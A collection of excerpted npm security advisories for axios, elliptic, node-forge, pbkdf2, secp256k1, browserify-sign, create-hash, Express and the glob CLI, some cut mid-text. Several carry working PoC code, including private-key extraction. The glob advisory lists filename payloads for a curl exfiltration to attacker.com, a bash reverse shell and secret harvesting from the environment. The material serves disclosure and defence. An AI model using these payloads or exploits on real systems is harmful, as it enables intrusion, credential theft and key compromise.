      "summary": "axios Requests Vulnerable To Possible SSRF and Credential Leakage via Absolute URL",
      "details": "### Summary\n\nA previously reported issue in axios demonstrated that using protocol-relative URLs could lead to SSRF (Server-Side Request Forgery). Reference: axios/axios#6463\n\nA similar problem that occurs when passing absolute URLs rather than protocol-relative URLs to axios has been identified. Even if ⁠`baseURL` is set, axios sends the request to the specified absolute URL, potentially causing SSRF and credential leakage. This issue impacts both server-side and client-side usage of axios.\n\n### Details\n\nConsider the following code snippet:\n\n```js\nimport axios from \"axios\";\n\nconst internalAPIClient = axios.create({\n  baseURL: \"http://example.test/api/v1/users/\",\n  headers: {\n    \"X-API-KEY\": \"1234567890\",\n  },\n});\n\n// const userId = \"123\";\nconst userId = \"http://attacker.test/\";\n\nawait internalAPIClient.get(userId); // SSRF\n```\n\nIn this example, the request is sent to `http://attacker.test/` instead of the `baseURL`. As a result, the domain owner of `attacker.test` would receive the `X-API-KEY` included in the request headers.\n\nIt is recommended that:\n\n-\tWhen `baseURL` is set, passing an absolute URL such as `http://attacker.test/` to `get()` should not ignore `baseURL`.\n-\tBefore sending the HTTP request (after combining the `baseURL` with the user-provided parameter), axios should verify that the resulting URL still begins with the expected `baseURL`.\n\n### PoC\n\nFollow the steps below to reproduce the issue:\n\n1.\tSet up two simple HTTP servers:\n\n```\nmkdir /tmp/server1 /tmp/server2\necho \"this is server1\" > /tmp/server1/index.html \necho \"this is server2\" > /tmp/server2/index.html\npython -m http.server -d /tmp/server1 10001 &\npython -m http.server -d /tmp/server2 10002 &\n```\n\n\n2.\tCreate a script (e.g., main.js):\n\n```js\nimport axios from \"axios\";\nconst client = axios.create({ baseURL: \"http://localhost:10001/\" });\nconst response = await client.get(\"http://localhost:10002/\");\nconsole.log(response.data);\n```\n\n3.\tRun the script:\n\n```\n$ node main.js\nthis is server2\n```\n\nEven though `baseURL` is set to `http://localhost:10001/`, axios sends the request to `http://localhost:10002/`.\n\n### Impact\n\n-\tCredential Leakage: Sensitive API keys or credentials (configured in axios) may be exposed to unintended third-party hosts if an absolute URL is passed.\n-\tSSRF (Server-Side Request Forgery): Attackers can send requests to other internal hosts on the network where the axios program is running.\n-\tAffected Users: Software that uses `baseURL` and does not validate path parameters is affected by this issue.",

      "details": "### Summary\n\nPrivate key can be extracted from ECDSA signature upon signing a malformed input (e.g. a string or a number), which could e.g. come from JSON network input\n\nNote that `elliptic` by design accepts hex strings as one of the possible input types\n\n### Details\n\nIn this code: https://github.com/indutny/elliptic/blob/3e46a48fdd2ef2f89593e5e058d85530578c9761/lib/elliptic/ec/index.js#L100-L107\n\n`msg` is a BN instance after conversion, but `nonce` is an array, and different BN instances could generate equivalent arrays after conversion.\n\nMeaning that a same `nonce` could be generated for different messages used in signing process, leading to `k` reuse, leading to private key extraction from a pair of signatures\n\nSuch a message can be constructed for any already known message/signature pair, meaning that the attack needs only a single malicious message being signed for a full key extraction\n\nWhile signing unverified attacker-controlled messages would be problematic itself (and exploitation of this needs such a scenario), signing a single message still _should not_ leak the private key\n\nAlso, message validation could have the same bug (out of scope for this report, but could be possible in some situations), which makes this attack more likely when used in a chain\n\n### PoC\n\n#### `k` reuse example\n\n```js\nimport elliptic from 'elliptic'\n\nconst { ec: EC } = elliptic\n\nconst privateKey = crypto.getRandomValues(new Uint8Array(32))\nconst curve = 'ed25519' // or any other curve, e.g. secp256k1\nconst ec = new EC(curve)\nconst prettyprint = ({ r, s }) => `r: ${r}, s: ${s}`\nconst sig0 = prettyprint(ec.sign(Buffer.alloc(32, 1), privateKey)) // array of ones\nconst sig1 = prettyprint(ec.sign('01'.repeat(32), privateKey)) // same message in hex form\nconst sig2 = prettyprint(ec.sign('-' + '01'.repeat(32), privateKey)) // same `r`, different `s`\nconsole.log({ sig0, sig1, sig2 })\n```\n\n#### Full attack\n\nThis doesn't include code for generation/recovery on a purpose (bit it's rather trivial)\n\n```js\nimport elliptic from 'elliptic'\n\nconst { ec: EC } = elliptic\n\nconst privateKey = crypto.getRandomValues(new Uint8Array(32))\nconst curve = 'secp256k1' // or any other curve, e.g. ed25519\nconst ec = new EC(curve)\n\n// Any message, e.g. previously known signature\nconst msg0 = crypto.getRandomValues(new Uint8Array(32))\nconst sig0 = ec.sign(msg0, privateKey)\n\n// Attack\nconst msg1 = funny(msg0) // this is a string here, but can also be of other non-Uint8Array types\nconst sig1 = ec.sign(msg1, privateKey)\n\nconst something = extract(msg0, sig0, sig1, curve)\n\nconsole.log('Curve:', curve)\nconsole.log('Typeof:', typeof msg1)\nconsole.log('Keys equal?', Buffer.from(privateKey).toString('hex') === something)\nconst rnd = crypto.getRandomValues(new Uint8Array(32))\nconst st = (x) => JSON.stringify(x)\nconsole.log('Keys equivalent?', st(ec.sign(rnd, something).toDER()) === st(ec.sign(rnd, privateKey).toDER()))\nconsole.log('Orig key:', Buffer.from(privateKey).toString('hex'))\nconsole.log('Restored:', something)\n```\n\nOutput:\n```console\nCurve: secp256k1\nTypeof: string\nKeys equal? true\nKeys equivalent? true\nOrig key: c7870f7eb3e8fd5155d5c8cdfca61aa993eed1fbe5b41feef69a68303248c22a\nRestored: c7870f7eb3e8fd5155d5c8cdfca61aa993eed1fbe5b41feef69a68303248c22a\n```\n\nSimilar for `ed25519`, but due to low `n`, the key might not match precisely but is nevertheless equivalent for signing:\n```console\nCurve: ed25519\nTypeof: string\nKeys equal? false\nKeys equivalent? true\nOrig key: f1ce0e4395592f4de24f6423099e022925ad5d2d7039b614aaffdbb194a0d189\nRestored: 01ce0e4395592f4de24f6423099e0227ec9cb921e3b7858581ec0d26223966a6\n```\n`restored` is equal to `orig` mod `N`.\n\n### Impact\n\nFull private key extraction when signing a single malicious message (that passes `JSON.stringify`/`JSON.parse`)",

This leads to a Denial-of-Service (DoS) via stack exhaustion when parsing untrusted DER inputs.\n\n### Details\n\nAn ASN.1 Denial of Service (Dos) vulnerability exists in the node-forge `asn1.fromDer` function within `forge/lib/asn1.js`. The ASN.1 DER parser implementation (`_fromDer`) recurses for every constructed ASN.1 value (SEQUENCE, SET, etc.) and lacks a guard limiting recursion depth. An attacker can craft a small DER blob containing a very large nesting depth of constructed TLVs which causes the Node.js V8 engine to exhaust its call stack and throw `RangeError: Maximum call stack size exceeded`, crashing or incapacitating the process handling the parse. This is a remote, low-cost Denial-of-Service against applications that parse untrusted ASN.1 objects.\n\n### Impact\n\nThis vulnerability enables an unauthenticated attacker to reliably crash a server or client using node-forge for TLS connections or certificate parsing.\n\nThis vulnerability impacts the ans1.fromDer function in `node-forge` before patched version `1.3.2`. \n\nAny downstream application using this component is impacted.

These arcs may be decoded as smaller, trusted OIDs due to 32-bit bitwise truncation, enabling the bypass of downstream OID-based security decisions.\n\n### Description\n\nAn ASN.1 OID Integer Truncation vulnerability exists in the node-forge `asn1.derToOid` function within `forge/lib/asn1.js`. OID components are decoded using JavaScript's bitwise left-shift operator (`<<`), which forcibly casts values to 32-bit signed integers. Consequently, if an attacker provides a mathematically unique, very large OID arc integer exceeding $2^{31}-1$, the value silently overflows and wraps around rather than throwing an error. \n\n### Impact\n\nThis vulnerability allows a specially crafted ASN.1 object to spoof an OID, where a malicious certificate with a massive, invalid OID is misinterpreted by the library as a trusted, standard OID, potentially bypassing security controls.\n\nThis vulnerability impacts the `asn1.derToOid` function in `node-forge` before patched version `1.3.2`. \n\nAny downstream application using this component is impacted.

Supported but non-normalized algos (e.g. `Sha256` / `Sha512` / `SHA1` / `sha-1` / `sha-256` / `sha-512`)\n\nAll of those work correctly in Node.js, but this polyfill silently returns highly predictable ouput\n\nUnder Node.js (only with `pbkdf2/browser` import, unlikely) / Bun (`pbkdf2` top-level import is affected), the memory is not zero-filled but is uninitialized, as `Buffer.allocUnsafe` is used\n\nUnder browsers, it just returns zero-filled buffers\n(Which is also critical, those are completely unacceptable as kdf output and ruin security)\n\n### Were you affected?\n\nThe full list of arguments that were **not** affected were literal:\n * `'md5'`\n * `'sha1'`\n * `'sha224'`\n * `'sha256'`\n * `'sha384'`\n * `'sha512'`\n * `'rmd160'`\n * `'ripemd160'`\n\nAny other arguments, e.g. representation variations of the above ones like `'SHA-1'`/`'sha-256'`/`'SHA512'` or  different algos like `'sha3-512'`/`'blake2b512'`, while supported on Node.js `crypto` module, returned predictable output on `pbkdf2` (or `crypto` browser/bundlers polyfill)\n\n---\n\nBeware of packages re-exporting this under a different signature, like (abstract):\n```js\nconst crypto = require('crypto')\nmodule.exports.deriveKey = (algo, pass, salt) => crypto.pbkdf2Sync(pass, salt, 2048, 64, algo)\n```\n\nIn this case, the resulting `deriveKey` method is also affected (to the same extent / conditions as listed here).\n\n### Environments\n\nThis affects `require('crypto')` in polyfilled mode (e.g. from `crypto-browserify`, `node-libs-browser`, `vite-plugin-node-polyfills`, `node-stdlib-browser`, etc. -- basically everything that bundles/polfyills `crypto`\n\n* In bundled code (e.g. Webpack / Vite / whatever), this affects `require('crypto')` and `require('pbkdf2')`\n* On Node.js, this does not affect `require('pbkdf2')` (or `require('crypto')` obviously), but affects `require('pbkdf2/browser')`\n* On Bun, this _does_ affect `require('pbkdf2')` _and_  `require('pbkdf2/browser')` (and returns uninitialized memory, often zeros / sparse flipped bytes)\n\n### PoC\n```js\nconst node = require('crypto')\nconst polyfill = require('pbkdf2/browser')\n\nconst algos = [\n  'sha3-512', 'sha3-256', 'SHA3-384',\n  'Sha256', 'Sha512', 'sha512-256',\n  'SHA1', 'sha-1',\n  'blake2b512',\n  'RMD160', 'RIPEMD-160', 'ripemd-160',\n]\nfor (const algo of algos) {\n  for (const { pbkdf2Sync } of [node, polyfill]) {\n    const key = pbkdf2Sync('secret', 'salt', 100000, 64, algo)\n    console.log(`${algo}: ${key.toString('hex')}`);\n  }\n}\n```\n\nOutput (odd lines are Node.js, even is `pbkdf2` module / polyfill):\n```\nsha3-512:

key.toString('hex')\n  if (hex !== prev) console.log(hex);\n  prev = hex\n}\n```\n\n### Affected versions\n\nSeems to be since https://github.com/browserify/pbkdf2/commit/9699045c37a07f8319cfb8d44e2ff4252d7a7078\n\n### Impact\n\nThis is critical, browserifying code might silently generate zero-filled keys instead of proper ones, for code that was working on Node.js or in test environment\n\nJust updating to a fixed version is not enough: if anyone was using `pbkdf2` lib (e.g. via `crypto-browserify` or directly) on algos not from the literal string list (see \"were you affected\"), recheck where those keys went / how they were used,  and take action accordingly\n\n### Note\n\nMost likely, you receive this either through a subdep using `pbkdf2` module directly (and then it is used), or through `crypto-browserify` (and the usage depends on whether you or any of your subdeps were calling `pbkdf2/pbkdf2Sync` methods from Node.js crypto inside your bundle)\n\nWhen targeting non-Node.js, prever avoiding Node.js crypto polyfill at all, and use `crypto.subtle` and/or modern/audited cryptography primitives instead",

      "details": "### Summary\n\nIn `elliptic`-based version, `loadUncompressedPublicKey` has a check that the public key is on the curve: https://github.com/cryptocoinjs/secp256k1-node/blob/6d3474b81d073cc9c8cc8cfadb580c84f8df5248/lib/elliptic.js#L37-L39\n\n`loadCompressedPublicKey` is, however, missing that check: https://github.com/cryptocoinjs/secp256k1-node/blob/6d3474b81d073cc9c8cc8cfadb580c84f8df5248/lib/elliptic.js#L17-L19\n\nThat allows the attacker to use public keys on low-cardinality curves to extract enough information to fully restore the private key from as little as 11 ECDH sessions, and very cheaply on compute power\n\nOther operations on public keys are also affected, including e.g. `publicKeyVerify()` incorrectly returning `true` on those invalid keys, and e.g. `publicKeyTweakMul()` also returning predictable outcomes allowing to restore the tweak \n\n### Details\n\nThe curve equation is `Y^2 = X^3 + 7`, and it restores `Y` from `X` in `loadCompressedPublicKey`, using `Y = sqrt(X^3 + 7)`, but when there are no valid `Y` values satisfying `Y^2 = X^3 + 7` for a given `X`, the same code calculates a solution for `-Y^2 = X^3 + 7`, and that solution also satisfies some other equation `Y^2 = X^3 + D`, where `D` is not equal to 7 and might be on a curve with factorizable cardinality, so `(X,Y)` might be a low-order point on that curve, lowering the number of possible ECDH output values to bruteforcable\n\nThose output values correspond to remainders which can be then combined with Chinese remainder theorem to restore the original value\n\nEndomorphism-based multiplication only slightly hinders restoration and does not affect the fact that the result is low-order\n\n10 different malicious X values could be chosen so that the overall extracted information is 238.4 bits out of 256 bit private key, and the rest is trivially bruteforcable with an additional 11th public key (which might be valid or not -- not significant)\n\nThe attacker does not need to _receive_ the ECDH value, they only need to be able to confirm it against a list of possible candidates, e.g. check if using it to decipher block/stream cipher would work -- and that could all be done locally on the attacker side\n\n### PoC\n\n#### Example public key\n\nThis key has order 39\nOne of the possible outcomes for it is a throw, 38 are predictable ECDH values\nKeys used in full attack have higher order (starting from ~20000), so are very unlikely to cause an error\n\n```js\nimport secp256k1 from 'secp256k1/elliptic.js'\nimport { randomBytes } from 'crypto'\n\nconst pub = Buffer.from('028ac57f9c6399282773c116ef21f7394890b6140aa6f25c181e9a91e2a9e3da45', 'hex')\n\nconst seen = new Set()\nfor (let i = 0; i < 1000; i++) {\n  try {\n    seen.add(Buffer.from(secp256k1.ecdh(pub, randomBytes(32))).toString('hex'))\n  } catch {\n    seen.add('failure also is an outcome')\n  }\n}\n\nconsole.log(seen.size) // 39\n```\n\n#### Full attack\nThis PoC doesn't list the exact public keys or the code for `solver.js` intentionally, but this exact code works, on arbitrary random private keys:\n\n```js\n// Only the elliptic version is affected, gyp one isn't\n// Node.js can use both, Web/RN/bundles always use the elliptic version\nimport secp256k1 from 'secp256k1/elliptic.js'\n\nimport { randomBytes } from 'node:crypto'\nimport assert from 'node:assert/strict'\nimport { Solver } from './solver.js'\n\nconst privateKey = randomBytes(32)\n\n// The full dataset is precomputed on a single MacBook Air in a few days and can be reused for any private key\nconst solver = new Solver\n\n// We need to run on 10 specially crafted public keys for this\n// Lower than 10 is possible but requires more compute\nfor (let i = 0; i < 10; i++) {\n  const letMeIn = solver.ping() // this is a normal 33-byte Uint8Array, a 02/03-prefixed compressed public key\n  assert(letMeIn instanceof Uint8Array) // true\n  assert(secp256k1.publicKeyVerify(letMeIn)) // true\n\n  // Returning ecdh value is not necessary but is used in this demo for simplicity\n  // Solver needs to _confirm_ an ecdh value against a set of precalculated known ones,\n  // which can be done even after it's hashed or used e.g. for a stream/block cipher, based on the encrypted data\n  solver.callback(secp256k1.ecdh(letMeIn, privateKey))\n\n  // Btw we have those precomputed so we can actually use those sessions to lower suspicion, most -- instantly\n}\n\n// Now, we need a single valid (or another invalid) public key to recheck things against\n// It can be anything, e.g. we can specify an 11th one, or create a valid one and use it\n// We'll be able to confirm/restore and use the ecdh value for this session too upon privateKey extraction\nconst anyPublicKey = secp256k1.publicKeyCreate(randomBytes(32))\nassert(secp256k1.publicKeyVerify(anyPublicKey)) // true (obviously)\n\n// Full complexity of this exploit requires solver to perform ~ 2^35 ecdh value checks (for all 10 keys combined),\n// which is ~ 1 TiB -- that can be done offline and does not require any further interaction with the target\n// The exact speed of the comparison step depends on how the ecdh values are used, but is not very significant\n// Direct non-indexed linear scan over all possible (precomputed) values takes <10 minutes on a MacBook Air\n// Confirming against e.g. cipher output would be somewhat slower, but still definitely possible + also could be precomputed\nconst extracted = solver.stab(anyPublicKey, secp256k1.ecdh(anyPublicKey, privateKey))\n\nconsole.log(`Extracted private key:  ${extracted.toString('hex')}`)\nconsole.log(`Actual private key was: ${privateKey.toString('hex')}`)\n\nassert(extracted.toString('hex') === privateKey.toString('hex'))\n\nconsole.log('Oops')\n```\n\nResult:\n```console\nExtracted private key:  e3370b1e6726a6ceaa51a2aacf419e25244e0cde08596780da021b238b74df3d\nActual private key was: e3370b1e6726a6ceaa51a2aacf419e25244e0cde08596780da021b238b74df3d\nOops\nnode example.js  178.80s user 13.59s system 74% cpu 4:17.01 total\n```\n\n### Impact\n\nRemote private key is extracted over 11 ECDH sessions\n\nThe attack is very low-cost, precompute took a few days on a single MacBook Air, and extraction takes ~10 minutes on the same MacBook Air\n\nAlso:\n* `publicKeyVerify()` misreports malicious public keys as valid\n* Same affects tweak extraction from `publicKeyTweakMul` result and other public key operations",

      "summary": "Axios is vulnerable to DoS attack through lack of data size check",
      "details": "## Summary\n\nWhen Axios runs on Node.js and is given a URL with the `data:` scheme, it does not perform HTTP. Instead, its Node http adapter decodes the entire payload into memory (`Buffer`/`Blob`) and returns a synthetic 200 response.\nThis path ignores `maxContentLength` / `maxBodyLength` (which only protect HTTP responses), so an attacker can supply a very large `data:` URI and cause the process to allocate unbounded memory and crash (DoS), even if the caller requested `responseType: 'stream'`.\n\n## Details\n\nThe Node adapter (`lib/adapters/http.js`) supports the `data:` scheme. When `axios` encounters a request whose URL starts with `data:`, it does not perform an HTTP request. Instead, it calls `fromDataURI()` to decode the Base64 payload into a Buffer or Blob.\n\nRelevant code from [`[httpAdapter](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L231)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L231):\n\n```js\nconst fullPath = buildFullPath(config.baseURL, config.url, config.allowAbsoluteUrls);\nconst parsed = new URL(fullPath, platform.hasBrowserEnv ? platform.origin : undefined);\nconst protocol = parsed.protocol || supportedProtocols[0];\n\nif (protocol === 'data:') {\n  let convertedData;\n  if (method !== 'GET') {\n    return settle(resolve, reject, { status: 405, ... });\n  }\n  convertedData = fromDataURI(config.url, responseType === 'blob', {\n    Blob: config.env && config.env.Blob\n  });\n  return settle(resolve, reject, { data: convertedData, status: 200, ... });\n}\n```\n\nThe decoder is in [`[lib/helpers/fromDataURI.js](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/helpers/fromDataURI.js#L27)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/helpers/fromDataURI.js#L27):\n\n```js\nexport default function fromDataURI(uri, asBlob, options) {\n  ...\n  if (protocol === 'data') {\n    uri = protocol.length ? uri.slice(protocol.length + 1) : uri;\n    const match = DATA_URL_PATTERN.exec(uri);\n    ...\n    const body = match[3];\n    const buffer = Buffer.from(decodeURIComponent(body), isBase64 ? 'base64' : 'utf8');\n    if (asBlob) { return new _Blob([buffer], {type: mime}); }\n    return buffer;\n  }\n  throw new AxiosError('Unsupported protocol ' + protocol, ...);\n}\n```\n\n* The function decodes the entire Base64 payload into a Buffer with no size limits or sanity checks.\n* It does **not** honour `config.maxContentLength` or `config.maxBodyLength`, which only apply to HTTP streams.\n* As a result, a `data:` URI of arbitrary size can cause the Node process to allocate the entire content into memory.\n\nIn comparison, normal HTTP responses are monitored for size, the HTTP adapter accumulates the response into a buffer and will reject when `totalResponseBytes` exceeds [`[maxContentLength](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L550)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L550). No such check occurs for `data:` URIs.\n\n\n## PoC\n\n```js\nconst axios = require('axios');\n\nasync function main() {\n  // this example decodes ~120 MB\n  const base64Size = 160_000_000; // 120 MB after decoding\n  const base64 = 'A'.repeat(base64Size);\n  const uri = 'data:application/octet-stream;base64,' + base64;\n\n  console.log('Generating URI with base64 length:', base64.length);\n  const response = await axios.get(uri, {\n    responseType: 'arraybuffer'\n  });\n\n  console.log('Received bytes:', response.data.length);\n}\n\nmain().catch(err => {\n  console.error('Error:', err.message);\n});\n```\n\nRun with limited heap to force a crash:\n\n```bash\nnode --max-old-space-size=100 poc.js\n```\n\nSince Node heap is capped at 100 MB, the process terminates with an out-of-memory error:\n\n```\n<--- Last few GCs --->\n…\nFATAL ERROR: Reached heap limit Allocation failed - JavaScript heap out of memory\n1: 0x… node::Abort() …\n…\n```\n\nMini Real App PoC:\nA small link-preview service that uses axios streaming, keep-alive agents, timeouts, and a JSON body.

If `config.maxContentLength` or `config.maxBodyLength` is set, reject URIs whose payload exceeds the limit.\n\n2. **Stream decoding**\n   Instead of decoding the entire payload in one `Buffer.from` call, decode the Base64 string in chunks using a streaming Base64 decoder. This would allow the application to process the data incrementally and abort if it grows too large.",

      "details": "### Summary\nAn upper bound check issue in `dsaVerify` function allows an attacker to construct signatures that can be successfully verified by any public key, thus leading to a signature forgery attack.\n\n### Details\nIn `dsaVerify` function, it checks whether the value of the signature is legal by calling function `checkValue`, namely, whether `r` and `s` are both in the interval `[1, q - 1]`. However, the second line of the `checkValue` function wrongly checks the upper bound of the passed parameters, since the value of `b.cmp(q)` can only be `0`, `1` and `-1`, and it can never be greater than `q`. \n\nIn this way, although the values of `s` cannot be `0`, an attacker can achieve the same effect as zero by setting its value to `q`, and then send `(r, s) = (1, q)` to pass the verification of any public key.\n\n### Impact\nAll places in this project that involve DSA verification of user-input signatures will be affected by this vulnerability.\n\n\n### Fix PR:\nSince the temporary private fork was deleted, here's a webarchive of the PR discussion and diff pages: [PR webarchive.zip](https://github.com/browserify/browserify-sign/files/13172957/PR.webarchive.zip)",

      "details": "### Summary\n\nThis affects e.g. `create-hash` (and `crypto-browserify`), so I'll describe the issue against that package\nAlso affects `create-hmac` and other packages\n\nNode.js `createHash` works only on strings or instances of Buffer, TypedArray, or DataView.\n\nMissing input type checks (in npm `create-hash` polyfill of Node.js `createHash`) can allow types other than a well-formed `Buffer` or `string`, resulting in invalid values, hanging and rewinding the hash state (including turning a tagged hash into an untagged hash), or other generally undefined behaviour.\n\n### Details\n\nSee PoC\n\n### PoC\n```js\nconst createHash = require('create-hash/browser.js')\nconst { randomBytes } = require('crypto')\n\nconst sha256 = (...messages) => {\n  const hash = createHash('sha256')\n  messages.forEach((m) => hash.update(m))\n  return hash.digest('hex')\n}\n\nconst validMessage = [randomBytes(32), randomBytes(32), randomBytes(32)] // whatever\n\nconst payload = forgeHash(Buffer.concat(validMessage), 'Hashed input means safe')\nconst receivedMessage = JSON.parse(payload) // e.g. over network, whatever\n\nconsole.log(sha256(...validMessage))\nconsole.log(sha256(...receivedMessage))\nconsole.log(receivedMessage[0])\n```\n\nOutput:\n```\n9ef59a6a745990b09bbf1d99abe43a4308b48ce365935e29eb4c9000984ee9a9\n9ef59a6a745990b09bbf1d99abe43a4308b48ce365935e29eb4c9000984ee9a9\nHashed input means safe\n```\n\nThis works with:\n```js\nconst forgeHash = (valid, wanted) => JSON.stringify([wanted, { length: -wanted.length }, { ...valid, length: valid.length }])\n```\n\nBut there are other types of input which lead to unchecked results\n\n### Impact\n\n1. Hash state rewind on `{length: -x}`. This is behind the PoC above, also this way an attacker can turn a tagged hash in cryptographic libraries into an untagged hash.\n2. Value miscalculation, e.g. a collision is generated by `{ length: buf.length, ...buf, 0: buf[0] + 256 }`\n    This will result in the same hash as of `buf`, but can be treated by other code differently (e.g. bn.js)\n4. DoS on `{length:'1e99'}`\n5. On a subsequent system, (2) can turn into matching hashes but different numeric representations, leading to issues up to private key extraction from cryptography libraries (as nonce is often generated through a hash, and matching nonces for different values often immediately leads to private key restoration, like [GHSA-vjh7-7g9h-fjfh](https://github.com/indutny/elliptic/security/advisories/GHSA-vjh7-7g9h-fjfh))\n6. Also, other typed arrays results are invalid, e.g. returned hash of `new Uint16Array(5)` is the same as `new Uint8Array(5)`, not `new Uint16Array(10)` as it should have been (and is in Node.js `crypto`) -- same for arrays with values non-zero, their hashes are just truncated to `%256` instead of converted to correct bytelength",

      "details": "### Impact\n\nVersions of Express.js prior to 4.19.2 and pre-release alpha and beta versions before 5.0.0-beta.3 are affected by an open redirect vulnerability using malformed URLs.\n\nWhen a user of Express performs a redirect using a user-provided URL Express performs an encode [using `encodeurl`](https://github.com/pillarjs/encodeurl) on the contents before passing it to the `location` header. This can cause malformed URLs to be evaluated in unexpected ways by common redirect allow list implementations in Express applications, leading to an Open Redirect via bypass of a properly implemented allow list.\n\nThe main method impacted is `res.location()` but this is also called from within `res.redirect()`.\n\n### Patches\n\nhttps://github.com/expressjs/express/commit/0867302ddbde0e9463d0564fea5861feb708c2dd\nhttps://github.com/expressjs/express/commit/0b746953c4bd8e377123527db11f9cd866e39f94\n\nAn initial fix went out with `express@4.19.0`, we then patched a feature regression in `4.19.1` and added improved handling for the bypass in `4.19.2`.\n\n### Workarounds\n\nThe fix for this involves pre-parsing the url string with either `require('node:url').parse` or `new URL`. These are steps you can take on your own before passing the user input string to `res.location` or `res.redirect`.\n\n### References\n\nhttps://github.com/expressjs/express/pull/5539\nhttps://github.com/koajs/koa/issues/1800\nhttps://expressjs.com/en/4x/api.html#res.location",

      "summary": "glob CLI: Command injection via -c/--cmd executes matches with shell:true",
      "details": "### Summary\n\nThe glob CLI contains a command injection vulnerability in its `-c/--cmd` option that allows arbitrary command execution when processing files with malicious names. When `glob -c <command> <patterns>` is used, matched filenames are passed to a shell with `shell: true`, enabling shell metacharacters in filenames to trigger command injection and achieve arbitrary code execution under the user or CI account privileges.\n\n### Details\n\n**Root Cause:**\nThe vulnerability exists in `src/bin.mts:277` where the CLI collects glob matches and executes the supplied command using `foregroundChild()` with `shell: true`:\n\n```javascript\nstream.on('end', () => foregroundChild(cmd, matches, { shell: true }))\n```\n\n**Technical Flow:**\n1. User runs `glob -c <command> <pattern>` \n2. CLI finds files matching the pattern\n3. Matched filenames are collected into an array\n4. Command is executed with matched filenames as arguments using `shell: true`\n5. Shell interprets metacharacters in filenames as command syntax\n6. Malicious filenames execute arbitrary commands\n\n**Affected Component:**\n- **CLI Only:** The vulnerability affects only the command-line interface\n- **Library Safe:** The core glob library API (`glob()`, `globSync()`, streams/iterators) is not affected\n- **Shell Dependency:** Exploitation requires shell metacharacter support (primarily POSIX systems)\n\n**Attack Surface:**\n- Files with names containing shell metacharacters: `$()`, backticks, `;`, `&`, `|`, etc.\n- Any directory where attackers can control filenames (PR branches, archives, user uploads)\n- CI/CD pipelines using `glob -c` on untrusted content\n\n### PoC\n\n**Setup Malicious File:**\n```bash\nmkdir test_directory && cd test_directory\n\n# Create file with command injection payload in filename\ntouch '$(touch injected_poc)'\n```\n\n**Trigger Vulnerability:**\n```bash\n# Run glob CLI with -c option\nnode /path/to/glob/dist/esm/bin.mjs -c echo \"**/*\"\n```\n\n**Result:**\n- The echo command executes normally\n- **Additionally:** The `$(touch injected_poc)` in the filename is evaluated by the shell\n- A new file `injected_poc` is created, proving command execution\n- Any command can be injected this way with full user privileges\n\n**Advanced Payload Examples:**\n\n**Data Exfiltration:**\n```bash\n# Filename: $(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)\ntouch '$(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)'\n```\n\n**Reverse Shell:**\n```bash\n# Filename: $(bash -i >& /dev/tcp/attacker.com/4444 0>&1)\ntouch '$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)'\n```\n\n**Environment Variable Harvesting:**\n```bash\n# Filename: $(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)\ntouch '$(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)'\n```\n\n### Impact\n\n**Arbitrary Command Execution:**\n- Commands execute with full privileges of the user running glob CLI\n- No privilege escalation required - runs as current user\n- Access to environment variables, file system, and network\n\n**Real-World Attack Scenarios:**\n\n**1. CI/CD Pipeline Compromise:**\n- Malicious PR adds files with crafted names to repository\n- CI pipeline uses `glob -c` to process files (linting, testing, deployment)\n- Commands execute in CI environment with build secrets and deployment credentials\n- Potential for supply chain compromise through artifact tampering\n\n**2. Developer Workstation Attack:**\n- Developer clones repository or extracts archive containing malicious filenames\n- Local build scripts use `glob -c` for file processing\n- Developer machine compromise with access to SSH keys, tokens, local services\n\n**3. Automated Processing Systems:**\n- Services using glob CLI to process uploaded files or external content\n- File uploads with malicious names trigger command execution\n- Server-side compromise with potential for lateral movement\n\n**4. Supply Chain Poisoning:**\n- Malicious packages or themes include files with crafted names\n- Build processes using glob CLI automatically process these files\n- Wide distribution of compromise through package ecosystems\n\n**Platform-Specific Risks:**\n- **POSIX/Linux/macOS:** High risk due to flexible filename characters and shell parsing\n- **Windows:** Lower risk due to filename restrictions, but vulnerability persists with PowerShell, Git Bash, WSL\n- **Mixed Environments:** CI systems often use Linux containers regardless of developer platform\n\n### Affected Products\n\n- **Ecosystem:** npm\n- **Package name:** glob\n- **Component:** CLI only (`src/bin.mts`)\n- **Affected versions:** v10.2.0 through v11.0.3 (and likely later versions until patched)\n- **Introduced:** v10.2.0 (first release with CLI containing `-c/--cmd` option)\n- **Patched versions:** 11.1.0and 10.5.0\n\n**Scope Limitation:**\n- **Library API Not Affected:** Core glob functions (`glob()`, `globSync()`, async iterators) are safe\n- **CLI-Specific:** Only the command-line interface with `-c/--cmd` option is vulnerable\n\n### Remediation\n\n- Upgrade to `glob@10.5.0`, `glob@11.1.0`, or higher, as soon as possible.\n- If any `glob` CLI actions fail, then convert commands containing positional arguments, to use the `--cmd-arg`/`-g` option instead.\n- As a last resort, use `--shell` to maintain `shell:true` behavior until glob v12, but take care to ensure that no untrusted contents can possibly be encountered in the file path results.",

